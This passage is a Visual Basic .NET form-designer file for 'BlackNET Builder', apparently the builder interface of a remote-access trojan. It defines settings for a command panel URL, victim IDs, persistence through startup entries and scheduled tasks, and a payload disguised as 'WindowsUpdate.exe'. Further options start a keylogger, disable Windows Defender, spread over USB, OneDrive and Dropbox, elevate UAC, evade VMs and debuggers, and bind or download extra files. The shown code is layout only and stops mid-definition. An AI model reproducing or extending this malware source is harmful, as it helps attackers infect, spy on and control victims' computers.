<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Main
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Main))
        Me.IconList = New System.Windows.Forms.ImageList(Me.components)
        Me.BuilderTheme = New BlackNET_Builder.NSTheme()
        Me.ClientExt = New BlackNET_Builder.NSComboBox()
        Me.CheckForUpdate = New BlackNET_Builder.NSButton()
        Me.PoweredBy = New BlackNET_Builder.KachClazz()
        Me.CloseSoftware = New BlackNET_Builder.NSControlButton()
        Me.CompileClient = New BlackNET_Builder.NSButton()
        Me.BuilderSettings = New BlackNET_Builder.NSTabControl()
        Me.MainSettings = New System.Windows.Forms.TabPage()
        Me.GenerateID = New BlackNET_Builder.NSButton()
        Me.DataSplitter = New BlackNET_Builder.NSTextBox()
        Me.NsLabel4 = New BlackNET_Builder.NSLabel()
        Me.MUTEX = New BlackNET_Builder.NSRandomPool()
        Me.VictimID = New BlackNET_Builder.NSTextBox()
        Me.NsLabel2 = New BlackNET_Builder.NSLabel()
        Me.CheckPanel = New BlackNET_Builder.NSButton()
        Me.PanelURL = New BlackNET_Builder.NSTextBox()
        Me.NsLabel1 = New BlackNET_Builder.NSLabel()
        Me.NsLabel3 = New BlackNET_Builder.NSLabel()
        Me.Persistence = New System.Windows.Forms.TabPage()
        Me.CriticalProcess = New BlackNET_Builder.NSCheckBox()
        Me.GenerateSleep = New BlackNET_Builder.NSButton()
        Me.ExecutionDelayTime = New BlackNET_Builder.NSTextBox()
        Me.NsLabel9 = New BlackNET_Builder.NSLabel()
        Me.DelayExecution = New BlackNET_Builder.NSCheckBox()
        Me.Watchdog = New BlackNET_Builder.NSCheckBox()
        Me.InstallPath = New BlackNET_Builder.NSComboBox()
        Me.StealthMode = New BlackNET_Builder.NSCheckBox()
        Me.FileName = New BlackNET_Builder.NSTextBox()
        Me.NsLabel6 = New BlackNET_Builder.NSLabel()
        Me.NsLabel5 = New BlackNET_Builder.NSLabel()
        Me.Startup = New BlackNET_Builder.NSRadioButton()
        Me.SchTask = New BlackNET_Builder.NSRadioButton()
        Me.Extra = New System.Windows.Forms.TabPage()
        Me.KeyloggerOnRun = New BlackNET_Builder.NSCheckBox()
        Me.DisableWD = New BlackNET_Builder.NSCheckBox()
        Me.DebugMode = New BlackNET_Builder.NSCheckBox()
        Me.USBSpread = New BlackNET_Builder.NSCheckBox()
        Me.ElevateUAC = New BlackNET_Builder.NSCheckBox()
        Me.BypassVM = New BlackNET_Builder.NSCheckBox()
        Me.EnableAES = New BlackNET_Builder.NSCheckBox()
        Me.OnedriveSpread = New BlackNET_Builder.NSCheckBox()
        Me.DropboxSpread = New BlackNET_Builder.NSCheckBox()
        Me.AntiDebugging = New BlackNET_Builder.NSCheckBox()
        Me.Binder = New System.Windows.Forms.TabPage()
        Me.DeleteFile = New BlackNET_Builder.NSButton()
        Me.AddFile = New BlackNET_Builder.NSButton()
        Me.DroperPath = New BlackNET_Builder.NSComboBox()
        Me.NsLabel7 = New BlackNET_Builder.NSLabel()
        Me.EnableBinder = New BlackNET_Builder.NSCheckBox()
        Me.FilesPaths = New BlackNET_Builder.NSListView()
        Me.Downloader = New System.Windows.Forms.TabPage()
        Me.DeleteLink = New BlackNET_Builder.NSButton()
        Me.AddLink = New BlackNET_Builder.NSButton()
        Me.DownloadPath = New BlackNET_Builder.NSComboBox()
        Me.NsLabel8 = New BlackNET_Builder.NSLabel()
        Me.EnableDownloader = New BlackNET_Builder.NSCheckBox()
        Me.DownloadLinksView = New BlackNET_Builder.NSListView()
        Me.ChangeIcon = New System.Windows.Forms.TabPage()
        Me.CustomIconFromFile = New BlackNET_Builder.NSRadioButton()
        Me.CustomIcon = New BlackNET_Builder.NSRadioButton()
        Me.NoIcon = New BlackNET_Builder.NSRadioButton()
        Me.AddIconFromFile = New BlackNET_Builder.NSButton()
        Me.IconPath = New BlackNET_Builder.NSTextBox()
        Me.IconListView = New System.Windows.Forms.ListView()
        Me.BuilderTheme.SuspendLayout()
        Me.BuilderSettings.SuspendLayout()
        Me.MainSettings.SuspendLayout()
        Me.Persistence.SuspendLayout()
        Me.Extra.SuspendLayout()
        Me.Binder.SuspendLayout()
        Me.Downloader.SuspendLayout()
        Me.ChangeIcon.SuspendLayout()
        Me.SuspendLayout()
        '
        'IconList
        '
        Me.IconList.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
        Me.IconList.ImageSize = New System.Drawing.Size(32, 32)
        Me.IconList.TransparentColor = System.Drawing.Color.Transparent
        '
        'BuilderTheme
        '
        Me.BuilderTheme.AccentOffset = 42
        Me.BuilderTheme.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.BuilderTheme.BorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.BuilderTheme.Colors = New BlackNET_Builder.Bloom(-1) {}
        Me.BuilderTheme.Controls.Add(Me.ClientExt)
        Me.BuilderTheme.Controls.Add(Me.CheckForUpdate)
        Me.BuilderTheme.Controls.Add(Me.PoweredBy)
        Me.BuilderTheme.Controls.Add(Me.CloseSoftware)
        Me.BuilderTheme.Controls.Add(Me.CompileClient)
        Me.BuilderTheme.Controls.Add(Me.BuilderSettings)
        Me.BuilderTheme.Customization = ""
        Me.BuilderTheme.Dock = System.Windows.Forms.DockStyle.Fill
        Me.BuilderTheme.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BuilderTheme.Image = Nothing
        Me.BuilderTheme.Location = New System.Drawing.Point(0, 0)
        Me.BuilderTheme.Movable = True
        Me.BuilderTheme.Name = "BuilderTheme"
        Me.BuilderTheme.NoRounding = False
        Me.BuilderTheme.Sizable = False
        Me.BuilderTheme.Size = New System.Drawing.Size(519, 261)
        Me.BuilderTheme.SmartBounds = True
        Me.BuilderTheme.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.BuilderTheme.TabIndex = 0
        Me.BuilderTheme.Text = "BlackNET Builder"
        Me.BuilderTheme.TransparencyKey = System.Drawing.Color.Empty
        Me.BuilderTheme.Transparent = False
        '
        'ClientExt
        '
        Me.ClientExt.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.ClientExt.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.ClientExt.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.ClientExt.ForeColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.ClientExt.FormattingEnabled = True
        Me.ClientExt.Items.AddRange(New Object() {".EXE - Executable", ".BAT - BAT File", ".CMD - CMD File", ".SCR - Screen Saver", ".PIF - PIF File"})
        Me.ClientExt.Location = New System.Drawing.Point(12, 233)
        Me.ClientExt.Name = "ClientExt"
        Me.ClientExt.Size = New System.Drawing.Size(121, 21)
        Me.ClientExt.TabIndex = 10
        '
        'CheckForUpdate
        '
        Me.CheckForUpdate.Location = New System.Drawing.Point(397, 233)
        Me.CheckForUpdate.Name = "CheckForUpdate"
        Me.CheckForUpdate.Size = New System.Drawing.Size(110, 23)
        Me.CheckForUpdate.TabIndex = 9
        Me.CheckForUpdate.Text = "Check for Update"
        '
        'PoweredBy
        '
        Me.PoweredBy.Font = New System.Drawing.Font("Segoe UI", 11.25!, System.Drawing.FontStyle.Bold)
        Me.PoweredBy.Location = New System.Drawing.Point(322, 233)
        Me.PoweredBy.Name = "PoweredBy"
        Me.PoweredBy.Size = New System.Drawing.Size(75, 23)
        Me.PoweredBy.TabIndex = 2
        Me.PoweredBy.Text = "BlackNET"
        Me.PoweredBy.Value1 = "Black"
        Me.PoweredBy.Value2 = "NET"
        '
        'CloseSoftware
        '
        Me.CloseSoftware.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.CloseSoftware.ControlButton = BlackNET_Builder.NSControlButton.Button.Close
        Me.CloseSoftware.Location = New System.Drawing.Point(493, 4)
        Me.CloseSoftware.Margin = New System.Windows.Forms.Padding(0)
        Me.CloseSoftware.MaximumSize = New System.Drawing.Size(18, 20)
        Me.CloseSoftware.MinimumSize = New System.Drawing.Size(18, 20)
        Me.CloseSoftware.Name = "CloseSoftware"
        Me.CloseSoftware.Size = New System.Drawing.Size(18, 20)
        Me.CloseSoftware.TabIndex = 1
        Me.CloseSoftware.Text = "Close"
        '
        'CompileClient
        '
        Me.CompileClient.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CompileClient.Location = New System.Drawing.Point(138, 232)
        Me.CompileClient.Name = "CompileClient"
        Me.CompileClient.Size = New System.Drawing.Size(109, 23)
        Me.CompileClient.TabIndex = 0
        Me.CompileClient.Text = "Compile Client"
        '
        'BuilderSettings
        '
        Me.BuilderSettings.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.BuilderSettings.Controls.Add(Me.MainSettings)
        Me.BuilderSettings.Controls.Add(Me.Persistence)
        Me.BuilderSettings.Controls.Add(Me.Extra)
        Me.BuilderSettings.Controls.Add(Me.Binder)
        Me.BuilderSettings.Controls.Add(Me.Downloader)
        Me.BuilderSettings.Controls.Add(Me.ChangeIcon)
        Me.BuilderSettings.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed
        Me.BuilderSettings.ItemSize = New System.Drawing.Size(28, 115)
        Me.BuilderSettings.Location = New System.Drawing.Point(12, 36)
        Me.BuilderSettings.Multiline = True
        Me.BuilderSettings.Name = "BuilderSettings"
        Me.BuilderSettings.SelectedIndex = 0
        Me.BuilderSettings.Size = New System.Drawing.Size(495, 191)
        Me.BuilderSettings.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.BuilderSettings.TabIndex = 0
        '
        'MainSettings
        '
        Me.MainSettings.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.MainSettings.Controls.Add(Me.GenerateID)
        Me.MainSettings.Controls.Add(Me.DataSplitter)
        Me.MainSettings.Controls.Add(Me.NsLabel4)
        Me.MainSettings.Controls.Add(Me.MUTEX)
        Me.MainSettings.Controls.Add(Me.VictimID)
        Me.MainSettings.Controls.Add(Me.NsLabel2)
        Me.MainSettings.Controls.Add(Me.CheckPanel)
        Me.MainSettings.Controls.Add(Me.PanelURL)
        Me.MainSettings.Controls.Add(Me.NsLabel1)
        Me.MainSettings.Controls.Add(Me.NsLabel3)
        Me.MainSettings.Location = New System.Drawing.Point(119, 4)
        Me.MainSettings.Name = "MainSettings"
        Me.MainSettings.Padding = New System.Windows.Forms.Padding(3)
        Me.MainSettings.Size = New System.Drawing.Size(372, 183)
        Me.MainSettings.TabIndex = 0
        Me.MainSettings.Text = "Main Settings"
        '
        'GenerateID
        '
        Me.GenerateID.Location = New System.Drawing.Point(232, 35)
        Me.GenerateID.Name = "GenerateID"
        Me.GenerateID.Size = New System.Drawing.Size(85, 23)
        Me.GenerateID.TabIndex = 1
        Me.GenerateID.Text = "Generate ID"
        '
        'DataSplitter
        '
        Me.DataSplitter.Cursor = System.Windows.Forms.Cursors.IBeam
        Me.DataSplitter.Location = New System.Drawing.Point(65, 149)
        Me.DataSplitter.MaxLength = 32767
        Me.DataSplitter.Multiline = False
        Me.DataSplitter.Name = "DataSplitter"
        Me.DataSplitter.ReadOnly = False
        Me.DataSplitter.Size = New System.Drawing.Size(161, 23)
        Me.DataSplitter.TabIndex = 8
        Me.DataSplitter.Text = "|BN|"
        Me.DataSplitter.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.DataSplitter.UseSystemPasswordChar = False
        '
        'NsLabel4
        '
        Me.NsLabel4.Font = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.NsLabel4.Location = New System.Drawing.Point(16, 149)
        Me.NsLabel4.Name = "NsLabel4"
        Me.NsLabel4.Size = New System.Drawing.Size(75, 23)
        Me.NsLabel4.TabIndex = 7
        Me.NsLabel4.Value1 = "Splitter: "
        '
        'MUTEX
        '
        Me.MUTEX.Location = New System.Drawing.Point(65, 64)
        Me.MUTEX.Name = "MUTEX"
        Me.MUTEX.Size = New System.Drawing.Size(161, 79)
        Me.MUTEX.TabIndex = 5
        Me.MUTEX.Text = "NsRandomPool1"
        '
        'VictimID
        '
        Me.VictimID.Cursor = System.Windows.Forms.Cursors.IBeam
        Me.VictimID.Location = New System.Drawing.Point(65, 35)
        Me.VictimID.MaxLength = 6
        Me.VictimID.Multiline = False
        Me.VictimID.Name = "VictimID"
        Me.VictimID.ReadOnly = False
        Me.VictimID.Size = New System.Drawing.Size(161, 23)
        Me.VictimID.TabIndex = 4
        Me.VictimID.Text = "HacKed"
        Me.VictimID.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.VictimID.UseSystemPasswordChar = False
        '
        'NsLabel2
        '
        Me.NsLabel2.Font = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.NsLabel2.Location = New System.Drawing.Point(7, 35)
        Me.NsLabel2.Name = "NsLabel2"
        Me.NsLabel2.Size = New System.Drawing.Size(75, 23)
        Me.NsLabel2.TabIndex = 3
        Me.NsLabel2.Text = "NsLabel2"
        Me.NsLabel2.Value1 = "Victim ID: "
        '
        'CheckPanel
        '
        Me.CheckPanel.Location = New System.Drawing.Point(232, 6)
        Me.CheckPanel.Name = "CheckPanel"
        Me.CheckPanel.Size = New System.Drawing.Size(85, 23)
        Me.CheckPanel.TabIndex = 2
        Me.CheckPanel.Text = "Check Panel"
        '
        'PanelURL
        '
        Me.PanelURL.Cursor = System.Windows.Forms.Cursors.IBeam
        Me.PanelURL.Location = New System.Drawing.Point(65, 6)
        Me.PanelURL.MaxLength = 32767
        Me.PanelURL.Multiline = False
        Me.PanelURL.Name = "PanelURL"
        Me.PanelURL.ReadOnly = False
        Me.PanelURL.Size = New System.Drawing.Size(161, 23)
        Me.PanelURL.TabIndex = 0
        Me.PanelURL.Text = "http://localhost/blacknet"
        Me.PanelURL.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.PanelURL.UseSystemPasswordChar = False
        '
        'NsLabel1
        '
        Me.NsLabel1.Font = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.NsLabel1.Location = New System.Drawing.Point(16, 6)
        Me.NsLabel1.Name = "NsLabel1"
        Me.NsLabel1.Size = New System.Drawing.Size(51, 23)
        Me.NsLabel1.TabIndex = 1
        Me.NsLabel1.Text = "BN URL: "
        Me.NsLabel1.Value1 = "BN URL: "
        '
        'NsLabel3
        '
        Me.NsLabel3.Font = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.NsLabel3.Location = New System.Drawing.Point(16, 91)
        Me.NsLabel3.Name = "NsLabel3"
        Me.NsLabel3.Size = New System.Drawing.Size(75, 23)
        Me.NsLabel3.TabIndex = 6
        Me.NsLabel3.Value1 = "MUTEX: "
        '
        'Persistence
        '
        Me.Persistence.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.Persistence.Controls.Add(Me.CriticalProcess)
        Me.Persistence.Controls.Add(Me.GenerateSleep)
        Me.Persistence.Controls.Add(Me.ExecutionDelayTime)
        Me.Persistence.Controls.Add(Me.NsLabel9)
        Me.Persistence.Controls.Add(Me.DelayExecution)
        Me.Persistence.Controls.Add(Me.Watchdog)
        Me.Persistence.Controls.Add(Me.InstallPath)
        Me.Persistence.Controls.Add(Me.StealthMode)
        Me.Persistence.Controls.Add(Me.FileName)
        Me.Persistence.Controls.Add(Me.NsLabel6)
        Me.Persistence.Controls.Add(Me.NsLabel5)
        Me.Persistence.Controls.Add(Me.Startup)
        Me.Persistence.Controls.Add(Me.SchTask)
        Me.Persistence.Location = New System.Drawing.Point(119, 4)
        Me.Persistence.Name = "Persistence"
        Me.Persistence.Size = New System.Drawing.Size(372, 183)
        Me.Persistence.TabIndex = 5
        Me.Persistence.Text = "Persistence"
        '
        'CriticalProcess
        '
        Me.CriticalProcess.Checked = False
        Me.CriticalProcess.Location = New System.Drawing.Point(137, 67)
        Me.CriticalProcess.Name = "CriticalProcess"
        Me.CriticalProcess.Size = New System.Drawing.Size(129, 23)
        Me.CriticalProcess.TabIndex = 12
        Me.CriticalProcess.Text = "Critical Process"
        '
        'GenerateSleep
        '
        Me.GenerateSleep.Location = New System.Drawing.Point(200, 151)
        Me.GenerateSleep.Name = "GenerateSleep"
        Me.GenerateSleep.Size = New System.Drawing.Size(66, 23)
        Me.GenerateSleep.TabIndex = 10
        Me.GenerateSleep.Text = "Generate"
        '
        'ExecutionDelayTime
        '
        Me.ExecutionDelayTime.Cursor = System.Windows.Forms.Cursors.IBeam
        Me.ExecutionDelayTime.Location = New System.Drawing.Point(73, 151)
        Me.ExecutionDelayTime.MaxLength = 32767
        Me.ExecutionDelayTime.Multiline = False
        Me.ExecutionDelayTime.Name = "ExecutionDelayTime"
        Me.ExecutionDelayTime.ReadOnly = False
        Me.ExecutionDelayTime.Size = New System.Drawing.Size(121, 23)
        Me.ExecutionDelayTime.TabIndex = 11
        Me.ExecutionDelayTime.Text = "1000"
        Me.ExecutionDelayTime.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.ExecutionDelayTime.UseSystemPasswordChar = False
        '
        'NsLabel9
        '
        Me.NsLabel9.Font = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.NsLabel9.Location = New System.Drawing.Point(5, 151)
        Me.NsLabel9.Name = "NsLabel9"
        Me.NsLabel9.Size = New System.Drawing.Size(75, 23)
        Me.NsLabel9.TabIndex = 10
        Me.NsLabel9.Text = "NsLabel9"
        Me.NsLabel9.Value1 = "Sleep Time: "
        '
        'DelayExecution
        '
        Me.DelayExecution.Checked = False
        Me.DelayExecution.Location = New System.Drawing.Point(16, 67)
        Me.DelayExecution.Name = "DelayExecution"
        Me.DelayExecution.Size = New System.Drawing.Size(115, 23)
        Me.DelayExecution.TabIndex = 9
        Me.DelayExecution.Text = "Delay Execution"
        '
        'Watchdog
        '
        Me.Watchdog.Checked = False
        Me.Watchdog.Location = New System.Drawing.Point(137, 38)
        Me.Watchdog.Name = "Watchdog"
        Me.Watchdog.Size = New System.Drawing.Size(159, 23)
        Me.Watchdog.TabIndex = 8
        Me.Watchdog.Text = "Enable Watchdog"
        '
        'InstallPath
        '
        Me.InstallPath.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.InstallPath.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.InstallPath.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.InstallPath.Enabled = False
        Me.InstallPath.ForeColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.InstallPath.FormattingEnabled = True
        Me.InstallPath.Items.AddRange(New Object() {"Temp ", "AppData", "UserProfile", "ProgramData", "WinDir"})
        Me.InstallPath.Location = New System.Drawing.Point(73, 125)
        Me.InstallPath.Name = "InstallPath"
        Me.InstallPath.Size = New System.Drawing.Size(121, 21)
        Me.InstallPath.TabIndex = 7
        '
        'StealthMode
        '
        Me.StealthMode.Checked = False
        Me.StealthMode.Location = New System.Drawing.Point(16, 38)
        Me.StealthMode.Name = "StealthMode"
        Me.StealthMode.Size = New System.Drawing.Size(115, 23)
        Me.StealthMode.TabIndex = 4
        Me.StealthMode.Text = "Stealth Mode"
        '
        'FileName
        '
        Me.FileName.Cursor = System.Windows.Forms.Cursors.IBeam
        Me.FileName.Enabled = False
        Me.FileName.Location = New System.Drawing.Point(73, 96)
        Me.FileName.MaxLength = 32767
        Me.FileName.Multiline = False
        Me.FileName.Name = "FileName"
        Me.FileName.ReadOnly = False
        Me.FileName.Size = New System.Drawing.Size(121, 23)
        Me.FileName.TabIndex = 2
        Me.FileName.Text = "WindowsUpdate.exe"
        Me.FileName.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.FileName.UseSystemPasswordChar = False
        '
        'NsLabel6
        '
        Me.NsLabel6.Font = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.NsLabel6.Location = New System.Drawing.Point(39, 123)
        Me.NsLabel6.Name = "NsLabel6"
        Me.NsLabel6.Size = New System.Drawing.Size(75, 23)
        Me.NsLabel6.TabIndex = 1
        Me.NsLabel6.Text = "Path: "
        Me.NsLabel6.Value1 = "Path: "
        '
        'NsLabel5
        '
        Me.NsLabel5.Font = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.NsLabel5.Location = New System.Drawing.Point(12, 96)
        Me.NsLabel5.Name = "NsLabel5"
        Me.NsLabel5.Size = New System.Drawing.Size(75, 23)
        Me.NsLabel5.TabIndex = 0
        Me.NsLabel5.Text = "File Name: "
        Me.NsLabel5.Value1 = "File Name: "
        '
        'Startup
        '
        Me.Startup.Checked = False
        Me.Startup.Location = New System.Drawing.Point(16, 9)
        Me.Startup.Name = "Startup"
        Me.Startup.Size = New System.Drawing.Size(115, 23)
        Me.Startup.TabIndex = 13
        Me.Startup.Text = "Add to Startup"
        '
        'SchTask
        '
        Me.SchTask.Checked = False
        Me.SchTask.Location = New System.Drawing.Point(137, 9)
        Me.SchTask.Name = "SchTask"
        Me.SchTask.Size = New System.Drawing.Size(159, 23)
        Me.SchTask.TabIndex = 14
        Me.SchTask.Text = "Add to Scheduled tasks"
        '
        'Extra
        '
        Me.Extra.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.Extra.Controls.Add(Me.KeyloggerOnRun)
        Me.Extra.Controls.Add(Me.DisableWD)
        Me.Extra.Controls.Add(Me.DebugMode)
        Me.Extra.Controls.Add(Me.USBSpread)
        Me.Extra.Controls.Add(Me.ElevateUAC)
        Me.Extra.Controls.Add(Me.BypassVM)
        Me.Extra.Controls.Add(Me.EnableAES)
        Me.Extra.Controls.Add(Me.OnedriveSpread)
        Me.Extra.Controls.Add(Me.DropboxSpread)
        Me.Extra.Controls.Add(Me.AntiDebugging)
        Me.Extra.Location = New System.Drawing.Point(119, 4)
        Me.Extra.Name = "Extra"
        Me.Extra.Padding = New System.Windows.Forms.Padding(3)
        Me.Extra.Size = New System.Drawing.Size(372, 183)
        Me.Extra.TabIndex = 1
        Me.Extra.Text = "Extra Features"
        '
        'KeyloggerOnRun
        '
        Me.KeyloggerOnRun.Checked = False
        Me.KeyloggerOnRun.Location = New System.Drawing.Point(127, 64)
        Me.KeyloggerOnRun.Name = "KeyloggerOnRun"
        Me.KeyloggerOnRun.Size = New System.Drawing.Size(125, 23)
        Me.KeyloggerOnRun.TabIndex = 9
        Me.KeyloggerOnRun.Text = "Start Keylogger"
        '
        'DisableWD
        '
        Me.DisableWD.Checked = False
        Me.DisableWD.Location = New System.Drawing.Point(252, 64)
        Me.DisableWD.Name = "DisableWD"
        Me.DisableWD.Size = New System.Drawing.Size(96, 23)
        Me.DisableWD.TabIndex = 8
        Me.DisableWD.Text = "Disable WD"
        '
        'DebugMode
        '
        Me.DebugMode.Checked = False
        Me.DebugMode.Location = New System.Drawing.Point(7, 90)
        Me.DebugMode.Name = "DebugMode"
        Me.DebugMode.Size = New System.Drawing.Size(97, 23)
        Me.DebugMode.TabIndex = 7
        Me.DebugMode.Text = "Debug Mode"
        '
        'USBSpread
        '
        Me.USBSpread.Checked = False
        Me.USBSpread.Location = New System.Drawing.Point(127, 35)
        Me.USBSpread.Name = "USBSpread"
        Me.USBSpread.Size = New System.Drawing.Size(95, 23)
        Me.USBSpread.TabIndex = 6
        Me.USBSpread.Text = "USB Spread"
        '
        'ElevateUAC
        '
        Me.ElevateUAC.Checked = False
        Me.ElevateUAC.Location = New System.Drawing.Point(252, 6)
        Me.ElevateUAC.Name = "ElevateUAC"
        Me.ElevateUAC.Size = New System.Drawing.Size(97, 23)
        Me.ElevateUAC.TabIndex = 5
        Me.ElevateUAC.Text = "Elevate UAC"
        '
        'BypassVM
        '
        Me.BypassVM.Checked = False
        Me.BypassVM.Location = New System.Drawing.Point(252, 35)
        Me.BypassVM.Name = "BypassVM"
        Me.BypassVM.Size = New System.Drawing.Size(87, 23)
        Me.BypassVM.TabIndex = 4
        Me.BypassVM.Text = "Bypass VM"
        '
        'EnableAES
        '
        Me.EnableAES.Checked = False
        Me.EnableAES.Location = New System.Drawing.Point(7, 61)
        Me.EnableAES.Name = "EnableAES"
        Me.EnableAES.Size = New System.Drawing.Size(123, 23)
        Me.EnableAES.TabIndex = 2
        Me.EnableAES.Text = "AES Encryption"
        '
        'OnedriveSpread
        '
        Me.OnedriveSpread.Checked = False
        Me.OnedriveSpread.Location = New System.Drawing.Point(127, 6)
        Me.OnedriveSpread.Name = "OnedriveSpread"
        Me.OnedriveSpread.Size = New System.Drawing.Size(125, 23)
        Me.OnedriveSpread.TabIndex = 0
        Me.OnedriveSpread.Text = "OneDrive Spread"
        '
        'DropboxSpread
        '
        Me.DropboxSpread.Checked = False
        Me.DropboxSpread.Location = New System.Drawing.Point(6, 6)
        Me.DropboxSpread.Name = "DropboxSpread"
        Me.DropboxSpread.Size = New System.Drawing.Size(124, 23)
        Me.DropboxSpread.TabIndex = 1
        Me.DropboxSpread.Text = "Dropbox Spread"
        '
        'AntiDebugging
        '
        Me.AntiDebugging.Checked = False
        Me.AntiDebugging.Location = New System.Drawing.Point(6, 32)
        Me.AntiDebugging.Name = "AntiDebugging"
        Me.AntiDebugging.Size = New System.Drawing.Size(124, 23)
        Me.AntiDebugging.TabIndex = 3
        Me.AntiDebugging.Text = "Anti-Debugging"
        '
        'Binder
        '
        Me.Binder.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.Binder.Controls.Add(Me.DeleteFile)
        Me.Binder.Controls.Add(Me.AddFile)
        Me.Binder.Controls.Add(Me.DroperPath)
        Me.Binder.Controls.Add(Me.NsLabel7)
        Me.Binder.Controls.Add(Me.EnableBinder)
        Me.Binder.Controls.Add(Me.FilesPaths)
        Me.Binder.Location = New System.Drawing.Point(119, 4)
        Me.Binder.Name = "Binder"
        Me.Binder.Padding = New System.Windows.Forms.Padding(3)
        Me.Binder.Size = New System.Drawing.Size(372, 183)
        Me.Binder.TabIndex = 2
        Me.Binder.Text = "Binder Settings"
        '
        'DeleteFile
        '
        Me.DeleteFile.Enabled = False
        Me.DeleteFile.Location = New System.Drawing.Point(312, 156)
        Me.DeleteFile.Name = "DeleteFile"
        Me.DeleteFile.Size = New System.Drawing.Size(54, 23)
        Me.DeleteFile.TabIndex = 5
        Me.DeleteFile.Text = "Del File"
        '
        'AddFile
        '
        Me.AddFile.Enabled = False
        Me.AddFile.Location = New System.Drawing.Point(248, 156)
        Me.AddFile.Name = "AddFile"
        Me.AddFile.Size = New System.Drawing.Size(58, 23)
        Me.AddFile.TabIndex = 4
        Me.AddFile.Text = "Add File"
        '
        'DroperPath
        '
        Me.DroperPath.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.DroperPath.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.DroperPath.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.DroperPath.Enabled = False
        Me.DroperPath.ForeColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.DroperPath.FormattingEnabled = True
        Me.DroperPath.Items.AddRange(New Object() {"Temp ", "AppData", "UserProfile", "ProgramData", "WinDir"})
        Me.DroperPath.Location = New System.Drawing.Point(55, 156)
        Me.DroperPath.Name = "DroperPath"
        Me.DroperPath.Size = New System.Drawing.Size(121, 21)
        Me.DroperPath.TabIndex = 3
        '
        'NsLabel7
        '
        Me.NsLabel7.Font = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.NsLabel7.Location = New System.Drawing.Point(4, 155)
        Me.NsLabel7.Name = "NsLabel7"
        Me.NsLabel7.Size = New System.Drawing.Size(75, 21)
        Me.NsLabel7.TabIndex = 2
        Me.NsLabel7.Text = "NsLabel7"
        Me.NsLabel7.Value1 = "Drop to: "
        '
        'EnableBinder
        '
        Me.EnableBinder.Checked = False
        Me.EnableBinder.Location = New System.Drawing.Point(6, 5)
        Me.EnableBinder.Name = "EnableBinder"
        Me.EnableBinder.Size = New System.Drawing.Size(114, 23)
        Me.EnableBinder.TabIndex = 1
        Me.EnableBinder.Text = "Enable Binder"
        '
        'FilesPaths
        '
        Me.FilesPaths.Columns = New BlackNET_Builder.NSListView.NSListViewColumnHeader(-1) {}
        Me.FilesPaths.Enabled = False
